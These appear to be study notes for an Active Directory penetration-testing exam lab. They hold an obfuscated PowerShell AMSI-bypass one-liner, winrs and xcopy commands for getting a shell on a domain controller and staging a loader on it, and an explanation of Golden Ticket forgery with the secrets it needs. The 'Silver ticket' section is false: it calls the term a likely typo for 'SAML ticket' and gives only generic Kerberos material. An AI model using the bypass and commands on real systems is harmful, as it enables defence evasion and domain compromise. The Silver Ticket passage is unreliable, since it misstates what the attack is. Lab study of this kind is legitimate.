**Exam tips** 
1. The report must contain detailed walk-through of your approach to compromise a box with screenshots, tools used and their outputs. Need to explain what a particular command does.
2. No tools will be available on the exam VM. You can upload Tools using the web access or RDP

**Check what command does with example**
	help invoke-serviceabuse -examples
	
**AMSI bypass**
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

RUN CMD as
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

check process is running as who
```
winrs -r:dcorp-dc cmd /c set username
```

Things To Note Down
 - aes256_hmac is Mostly used for OverPass-The-Hash attack
 - NTLM Hash is called rc4_hmac_nt
- Run tasklist /svc to view processes

To directly have commands execution on the machine 
```
winrs -r:dcorp-dc cmd
```
To run command from your machine on a target 
```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
``````

whoami /user

---

==**golden ticket**==
A Golden Ticket attack works by an attacker obtaining the secret key from a Kerberos Key Distribution Center (KDC) or the password hash of a privileged account, typically an administrator. With this key, the attacker forges a Kerberos ticket that grants them access to any account on the network. This forged ticket mimics legitimate authentication, allowing the attacker to log in as any user, including those with high-level privileges. By leveraging this access, they can navigate the network freely, steal sensitive information, or execute malicious activities without being detected.

A Golden Ticket attack is like making a fake VIP pass to get into any club. Here’s how it works:

1. **Stealing the Key**: The attacker gets hold of a special key (like a master key) that opens all the doors in the network.
    
2. **Creating the Fake Pass**: Using that key, they create a fake VIP pass (the Golden Ticket) that looks real.
    
3. **Getting In**: With the fake pass, the attacker can walk into any room (or access any account) without anyone questioning them.
    
4. **Doing Bad Stuff**: Now they can steal stuff, mess with systems, or do whatever they want, all while pretending to be someone important.
    

In short, it’s a sneaky way to bypass security and gain unlimited access to a network!
things req
```
Domain
domain SID (any user sid exclude last 4 digits)
KRBTGT password hash
```
---

==Silver ticket==
In the context of Kerberos, a "Siler ticket" is likely a typo or confusion with "SAML ticket" or just a general reference to "tickets" used in Kerberos authentication.

In simple terms, Kerberos is a network authentication protocol that uses "tickets" to allow users to access services securely without needing to repeatedly enter passwords. Here’s how it works:

1. **User Login:** A user logs into the system and requests access to services.
2. **Authentication Server (AS):** The user’s credentials are sent to an authentication server, which verifies them.
3. **Ticket Granting Ticket (TGT):** If the credentials are correct, the server issues a Ticket Granting Ticket (TGT). This ticket is encrypted and can be used to request other service tickets.
4. **Service Ticket:** When the user wants to access a specific service, they use the TGT to request a service ticket from the Ticket Granting Service (TGS).
5. **Accessing Services:** The user then presents the service ticket to the desired service, allowing access without needing to enter a password again.

Here’s a super simple breakdown of Kerberos tickets:

1. **Log In:** You type in your username and password.
2. **Get a Key:** If your info is correct, you get a special key called a Ticket Granting Ticket (TGT).
3. **Request Access:** When you want to use a service (like a printer or a file), you use the TGT to ask for another ticket for that service.
4. **Get the Service Ticket:** The system gives you a service ticket that says, “This person can use this service.”
5. **Use the Service:** You show this ticket to the service, and it lets you in without needing to type your password again.

---

